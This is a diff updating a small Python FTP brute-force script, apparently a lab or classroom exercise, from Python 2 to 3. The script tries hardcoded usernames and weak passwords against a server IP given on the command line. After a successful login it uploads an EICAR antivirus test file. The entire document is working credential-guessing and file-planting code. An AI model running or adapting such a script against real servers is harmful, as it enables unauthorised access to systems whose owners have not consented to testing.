@@ -1,6 +1,6 @@
 #!/usr/bin/python3
 from ftplib import FTP
-import io,sys
+import io,sys,ftplib
  
 users = ['admin','sys','demo','insa']
 passwords = ['1234','123456','@password']
@@ -16,14 +16,14 @@ def bruteforce(server):
 			try:
 				ftp = FTP(server)      
 				ftp.login(user,password)     
-				print "[++] Compte identifie : "+user+" / Mot de passe : "+password
+				print ("[++] Compte identifie : "+user+" / Mot de passe : "+password)
 				createeicar()
 				file = open('eicar.txt','rb')  
 				ftp.storbinary('STOR eicar.com', file)
-				print "[++] Fichier depose"
+				print ("[++] Fichier depose")
 				stop() 
-			except:
-				print "[-] Erreur de connexion avec le compte : "+user+" / Mot de passe : "+password
+			except ftplib.error_perm:
+				print ("[-] Erreur de connexion avec le compte : "+user+" / Mot de passe : "+password)
 
 if __name__ == '__main__':
 	try:
@@ -32,7 +32,7 @@ if __name__ == '__main__':
 		server = ""
         
 	if server=="":
-		print " Syntaxe : "+sys.argv[0]+" IP_du_serveur"
+		print (" Syntaxe : "+sys.argv[0]+" IP_du_serveur")
 		exit()
-	print "[+] Test sur le serveur : "+server
+	print ("[+] Test sur le serveur : "+server)
 	bruteforce(server)
